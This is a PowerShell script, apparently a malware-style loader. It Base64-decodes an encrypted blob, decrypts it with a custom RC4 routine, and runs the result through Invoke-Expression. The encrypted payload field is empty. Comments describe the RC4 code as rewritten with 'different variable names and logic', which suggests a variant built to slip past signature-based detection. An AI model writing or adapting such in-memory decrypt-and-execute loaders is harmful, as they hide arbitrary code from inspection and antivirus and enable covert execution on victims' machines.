
# Encrypted PowerShell Script
# Alternative RC4 Decryption implementation

# Encrypted data and key in Base64 format
$encDataB64 = ''
$secKeyB64 = 'INRBT/3iY60tkd2S9qLsJQ=='

# Base64 conversion functions
$b64ToBytes = {
    param([string]$b64Str)
    return [System.Convert]::FromBase64String($b64Str)
}

$encBytes = & $b64ToBytes $encDataB64
$keyBytes = & $b64ToBytes $secKeyB64

# Alternative RC4 implementation with different variable names and logic
$rc4Proc = {
    param(
        [byte[]]$inputData,
        [byte[]]$cryptKey
    )
    
    $output = new-object byte[] $inputData.Length
    $sTable = new-object byte[] 256
    
    # Initialize state table
    for ($idx = 0; $idx -lt 256; $idx++) {
        $sTable[$idx] = $idx
    }
    
    # Key scheduling with different algorithm
    $keyIdx = 0
    for ($idx = 0; $idx -lt 256; $idx++) {
        $keyIdx = ($keyIdx + $sTable[$idx] + $cryptKey[$idx % $cryptKey.Length]) % 256
        
        # Swap elements using intermediate variable
        $swapTemp = $sTable[$idx]
        $sTable[$idx] = $sTable[$keyIdx]
        $sTable[$keyIdx] = $swapTemp
    }
    
    # Stream generation with different counter names
    $ctr1 = 0
    $ctr2 = 0
    
    for ($idx = 0; $idx -lt $inputData.Length; $idx++) {
        $ctr1 = ($ctr1 + 1) % 256
        $ctr2 = ($ctr2 + $sTable[$ctr1]) % 256
        
        # Swap using arithmetic method
        $sTable[$ctr1], $sTable[$ctr2] = $sTable[$ctr2], $sTable[$ctr1]
        
        # XOR operation with different keystream calculation
        $keyByte = $sTable[(($sTable[$ctr1] + $sTable[$ctr2]) % 256)]
        $output[$idx] = $inputData[$idx] -bxor $keyByte
    }
    
    return $output
}

# Decryption wrapper function
$decryptRC4 = {
    param(
        [byte[]]$encBytes,
        [byte[]]$keyBytes
    )
    
    try {
        $decBytes = & $rc4Proc -inputData $encBytes -cryptKey $keyBytes
        $scriptText = [System.Text.Encoding]::UTF8.GetString($decBytes)
        return $scriptText
    }
    catch {
        Write-Error $_.Exception.Message
        return $null
    }
}

# Execute decryption and run script
$decryptedScript = & $decryptRC4 -encBytes $encBytes -keyBytes $keyBytes

if ($decryptedScript) {
    Invoke-Expression -Command $decryptedScript
} else {
    Write-Host "Decryption failed!"
}